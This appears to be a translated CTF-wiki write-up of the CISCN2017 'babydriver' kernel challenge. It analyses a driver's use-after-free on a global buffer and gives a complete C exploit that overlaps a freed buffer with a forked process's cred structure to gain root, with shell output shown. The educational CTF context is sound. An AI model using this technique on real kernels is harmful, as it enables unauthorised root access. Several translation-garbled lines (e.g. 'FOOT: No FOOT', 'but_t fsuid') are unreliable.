[EN](./kernel_uaf.md) | [ZH](./kernel_uaf-zh.md)
## kernel UAF


### CISCN2017 - baby driver
[attachment here](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)



#### Analysis
Unzip rootfs.cpio first and see what files are there.
```bash

CISCN2017_babydriver [master●] mkdir core

CISCN2017_babydriver [master●] cd core 

core [master●] mv ../rootfs.cpio rootfs.cpio.gz

core [master●●] gunzip ./rootfs.cpio.gz 

core [master ●] ls
rootfs.cpio

core [master●] cpio -idmv < rootfs.cpio 

.

etc

etc/init.d

etc/passwd

etc/group

...

...

usr/sbin/rdev

usr/sbin/ether-wake

tmp

linuxrc

home

home/ctf

5556 blocks
core [master ●] ls
bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr

core [master●] bat init

───────┬─────────────────────────────────────────────────────────────────────────────────

       │ File: init

───────┼─────────────────────────────────────────────────────────────────────────────────

1 │ #! / Bin / sh
   2   │

   3   │ mount -t proc none /proc

   4   │ mount -t sysfs none /sys

   5   │ mount -t devtmpfs devtmpfs /dev

   6   │ chown root:root flag

   7   │ chmod 400 flag

   8   │ exec 0</dev/console

   9   │ exec 1>/dev/console

  10   │ exec 2>/dev/console

  11   │

  12   │ insmod /lib/modules/4.4.72/babydriver.ko

13 │ chmod 777 / dev / babydev
  14   │ echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"

  15   │ setsid cttyhack setuidgid 1000 sh

  16   │

  17   │ umount /proc

  18   │ umount /sys

  19   │ poweroff -d 0  -f

  20   │

───────┴────────────────────────────────────────────────────────────

```

According to the content of init, the driver of `babydriver.ko` is loaded in 12 lines. According to the general routine of pwn, this is the vulnerable LKM. The other commands in init are common commands for linux and will not be explained.


Take this driver file out.


```bash

core [master●] cp ./lib/modules/4.4.72/babydriver.ko ..

core [master ●] cd ..
CISCN2017_babydriver [master●] check ./babydriver.ko

./babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped

[*] '/home/m4x/pwn_repo/CISCN2017_babydriver/babydriver.ko'

    Arch:     amd64-64-little

    RELRO:    No RELRO

    Stack:    No canary found

    NX:       NX enabled

FOOT: No FOOT (0x0)
```

No PIE, no canary protection, no symbol table removed, very nice.


Open the analysis with IDA. Since the symbol table is not removed, shift + F9 first looks at what structure, you can find the following structure:
`` `asm
00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)

00000000                                         ; XREF: .bss:babydev_struct/r

00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r

00000000                                         ; babyopen+26/w ... ; offset

00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w

00000008; babyioctl + 3C / w ...
00000010 babydevice_t    ends

00000010

```



Look at the main function


**babyioctl:** Defines the 0x10001 command, you can release the device\_buf in the global variable babydev\_struct, and then reapply a block of memory according to the size passed by the user, and set device\_buf\_len.
```C

// local variable allocation has failed, the output may be wrong!

void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)

{

  size_t v3; // rdx

  size_t v4; // rbx

  __int64 v5; // rdx



  _fentry__(filp, *(_QWORD *)&command);

v4 = v3;
  if ( command == 0x10001 )

  {

    kfree(babydev_struct.device_buf);

    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);

    babydev_struct.device_buf_len = v4;

    printk("alloc done\n", 0x24000C0LL, v5);

  }

  else

  {

    printk("\x013defalut:arg is %ld\n", v3, v3);

  }

}

```



**babyopen:** Apply for a space of 0x40 bytes, the address is stored in the global variable babydev\_struct.device\_buf, and update babydev\_struct.device\_buf\_len
```C

int __fastcall babyopen(inode *inode, file *filp)

{

  __int64 v2; // rdx



  _fentry__(inode, filp);

  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);

babydev_struct.device_buf_len = 64LL;
  printk("device open\n", 0x24000C0LL, v2);

  return 0;

}

```


**babyread:** First check if the length is less than babydev\_struct.device\_buf\_len, then copy the data in babydev\_struct.device\_buf to the buffer, the buffer and the length are the parameters passed by the user.
```C

void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)

{

  size_t v4; // rdx



  _fentry__(filp, buffer);

  if ( babydev_struct.device_buf )

  {

    if ( babydev_struct.device_buf_len > v4 )

      copy_to_user(buffer, babydev_struct.device_buf, v4);

  }

}

```



**babywrite:** Similar to babyread, the difference is from the buffer copy to the global variable
```C

void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)

{

  size_t v4; // rdx



  _fentry__(filp, buffer);

  if ( babydev_struct.device_buf )

  {

    if ( babydev_struct.device_buf_len > v4 )

      copy_from_user(babydev_struct.device_buf, buffer, v4);

  }

}

```



**babyrelease:** free up space, nothing to say
```C

int __fastcall babyrelease(inode *inode, file *filp)

{

  __int64 v2; // rdx



  _fentry__(inode, filp);

  kfree(babydev_struct.device_buf);

  printk("device release\n", filp, v2);

  return 0;

}

```



There are also two functions, babydriver\_init() and babydriver\_exit(), which complete the initialization and cleanup of the **/dev/babydev** device respectively. Check the usage of the function and no longer analyze it.


#### Ideas
There are no vulnerabilities such as user-space traditional overflow, but there is a UAF vulnerability caused by pseudo-conditional competition.


This means that if we open both devices at the same time, the second time will overwrite the first allocated space, because babydev\_struct is global. Similarly, if the first one is released, then the second one is actually released, which results in a UAF.


So how do you use UAF? As mentioned before, the cred structure can be modified to grant root to root.


The 4.7.22 cred structure [definition] (https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118) is as follows:
```C

struct cred {
	atomic_t	usage;

#ifdef CONFIG_DEBUG_CREDENTIALS

	atomic_t	subscribers;	/* number of processes subscribed */

	void		*put_addr;

	unsigned	magic;

#define CRED_MAGIC	0x43736564

#define CRED_MAGIC_DEAD	0x44656144

#endif
	kuid_t		uid;		/* real UID of the task */

	kgid_t		gid;		/* real GID of the task */

	kuid_t		suid;		/* saved UID of the task */

	kgid_t		sgid;		/* saved GID of the task */

	kuid_t		euid;		/* effective UID of the task */

	kgid_t		egid;		/* effective GID of the task */

but_t fsuid; / * UID for VFS ops * /
	kgid_t		fsgid;		/* GID for VFS ops */

	unsigned	securebits;	/* SUID-less security management */

	kernel_cap_t	cap_inheritable; /* caps our children can inherit */

	kernel_cap_t	cap_permitted;	/* caps we're permitted */

	kernel_cap_t	cap_effective;	/* caps we can actually use */

	kernel_cap_t	cap_bset;	/* capability bounding set */

	kernel_cap_t	cap_ambient;	/* Ambient capability set */

#ifdef CONFIG_KEYS

	unsigned char	jit_keyring;	/* default keyring to attach requested

					 * keys to */

	struct key __rcu *session_keyring; /* keyring inherited over fork */

	struct key	*process_keyring; /* keyring private to this process */

	struct key	*thread_keyring; /* keyring private to this thread */

	struct key	*request_key_auth; /* assumed request_key authority */

#endif
#ifdef CONFIG_SECURITY

	void		*security;	/* subjective LSM security */

#endif
	struct user_struct *user;	/* real user ID subscription */

	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */

	struct group_info *group_info;	/* supplementary groups for euid/fsgid */

	struct rcu_head	rcu;		/* RCU deletion hook */

};

```



Then according to the UAF&#39;s thinking, the idea is as follows:


1. Turn on the device twice and change its size to the size of the cred structure via ioctl
2. Release one, fork a new process, then the space of the cred of this new process will overlap with the previously released space
3. At the same time, we can write to this space through another file descriptor, just need to change uid, gid to 0, that is, you can achieve the right to root


Need to determine the size of the cred structure, with the source code, the size is well defined. The calculation is 0xa8 (note the source code using the same kernel version).




#### Exploit



The comments are written in the code, [exploit here](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)
```C

CISCN2017_babydriver [master●●] cat exploit.c 

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <fcntl.h>

#include <stropts.h>

#include <sys/wait.h>

#include <sys/stat.h>



int main()

{

// Open the device twice
	int fd1 = open("/dev/babydev", 2);

	int fd2 = open("/dev/babydev", 2);



// Modify babydev_struct.device_buf_len to sizeof(struct cred)
	ioctl(fd1, 0x10001, 0xa8);


// release fd1
	close(fd1);



// The cred space of the new process will overlap with the babydev_struct just released
	int pid = fork();

	if(pid < 0)

	{

		puts("[*] fork error!");

		exit(0);

	}



	else if(pid == 0)

	{

// Modify the uid of the cred of the new process by changing fd2, the value of gid is 0.
		char zeros[30] = {0};

		write(fd2, zeros, 28);



		if(getuid() == 0)

		{

			puts("[+] root now.");

			system("/bin/sh");

			exit(0);

		}

	}

	

	else

	{

		wait(NULL);

	}

	close(fd2);



	return 0;

}

```



#### get root shell

```bash

// statically compile the file, there is no libc in the kernel
CISCN2017_babydriver [master●●] gcc exploit.c -static -o exploit

CISCN2017_babydriver [master●●] file exploit

exploit: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=90aabed5497b6922fda3d5118e4aa9cb2fa5ccc5, not stripped

// Repackage rootfs.cpio in the directory where the compiled exp is extracted.
CISCN2017_babydriver [master●●] cp exploit core/tmp 

CISCN2017_babydriver [master●●] cd core 

core [master●●] find . | cpio -o --format=newc > rootfs.cpio

7017 block
core [master●●] cp rootfs.cpio ..

core [master ●●] cd ..
// kvm requires root privileges
CISCN2017_babydriver [master●●] sudo ./boot.sh

......

......



/ $ ls / tmp /
exploit

/ $ id

uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)

/ $ /tmp/exploit

[   14.376187] device open

[   14.376715] device open

[   14.377201] alloc done

[   14.377629] device release

[+] root now.

/ # id

uid=0(root) gid=0(root) groups=1000(ctf)

/ #



```



Of course, you can also use rop to do the next analysis.




## Reference:



https://bbs.pediy.com/thread-247054.htm



https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html



http://muhe.live/2017/07/13/babydriver-writeup/



https://www.anquanke.com/post/id/86490
